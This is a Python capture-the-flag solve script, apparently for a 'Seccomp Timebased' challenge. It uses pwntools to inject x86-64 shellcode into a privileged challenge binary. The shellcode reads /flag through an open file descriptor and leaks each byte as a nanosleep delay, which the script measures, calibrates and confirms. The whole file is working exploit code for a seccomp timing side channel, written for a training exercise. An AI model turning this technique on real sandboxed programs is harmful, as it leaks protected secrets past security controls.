# Seccomp Timebased
import statistics
import time
from collections import Counter

import pwn
from dojotool import find_challenge

# 每个字符值对应的时间间隔。
# 同步计时后可以缩小，但建议至少保留 1ms。
SLEEP_STEP_NS = 3_000_000

# 每轮额外执行一次空载测量，用于消除发送、反汇编输出、
# seccomp 加载和进程终止的固定开销。
CALIBRATION_SAMPLES = 5

# 同一个结果累计出现多少次后确认。
REQUIRED_MATCHES = 3


def run_shellcode(root_bin: str, shellcode: bytes) -> int:
    with pwn.process([root_bin, "/flag"], raw=True, level="error") as io:
        io.recvuntil(b"Reading 0x1000 bytes of shellcode from stdin.\n")
        start = time.perf_counter_ns()
        io.send(shellcode)
        io.recvrepeat()
        return time.perf_counter_ns() - start


def calibrate(root_bin: str) -> int:
    samples = [run_shellcode(root_bin, pwn.asm("ret")) for _ in range(CALIBRATION_SAMPLES)]

    baseline_ns = int(statistics.median(samples))

    print(
        f"[+] baseline: {baseline_ns / 1_000_000:.3f} ms",
        flush=True,
    )

    return baseline_ns


def make_read_shellcode(index: int) -> bytes:
    # mmap 范围为 0x1337000 至 0x1337fff。
    timespec = 0x1337F00
    flag_buffer = 0x1337F20

    return pwn.asm(f"""
        /*
         * read(3, flag_buffer, index + 1)
         */
        mov edi, 3
        mov rsi, {flag_buffer}
        mov edx, {index + 1}
        xor eax, eax
        syscall

        /*
         * 读取不足表示 EOF。
         * EOF 分支不执行 nanosleep。
         */
        cmp rax, {index + 1}
        jl done

        /*
         * timespec.tv_sec = 0
         */
        mov qword ptr [{timespec}], 0

        /*
         * timespec.tv_nsec =
         *     SLEEP_BASE_NS
         *     + flag[index] * SLEEP_STEP_NS
         */
        movzx eax, byte ptr [{flag_buffer + index}]
        imul rax, rax, {SLEEP_STEP_NS}

        mov qword ptr [{timespec + 8}], rax

        /*
         * nanosleep(&timespec, NULL)
         */
        mov rdi, {timespec}
        xor esi, esi
        mov eax, 35
        syscall

    done:
        ret
    """)


def one_round(
    root_bin: str,
    baseline_ns: int,
    index: int,
) -> tuple[int, int]:
    shellcode = make_read_shellcode(index)
    elapsed_ns = run_shellcode(root_bin, shellcode)
    encoded_ns = elapsed_ns - baseline_ns
    value = round(encoded_ns / SLEEP_STEP_NS)
    return value, encoded_ns


def confirmed_round(
    root_bin: str,
    baseline_ns: int,
    index: int,
) -> int:
    counts: Counter[int] = Counter()
    attempts = 0

    while True:
        attempts += 1

        value, encoded_ns = one_round(root_bin, baseline_ns, index)
        counts[value] += 1
        count = counts[value]

        print(
            f"[{index:02d}] attempt {attempts}: "
            f"0x{value:02x} ({value!r}), "
            f"encoded={encoded_ns / 1_000_000:.3f} ms, "
            f"matches={count}/{REQUIRED_MATCHES}",
        )

        if count >= REQUIRED_MATCHES:
            return value


def ctf() -> None:
    root_bin = find_challenge()
    baseline_ns = calibrate(root_bin)

    flag = bytearray()

    for index in range(0x100):
        value = confirmed_round(root_bin, baseline_ns, index)

        flag.append(value)

        print(
            f"[{index:02d}] 0x{value:02x} {flag.decode(errors='replace')}",
            flush=True,
        )

        if value == ord("}") or value == 0:
            break


if __name__ == "__main__":
    ctf()
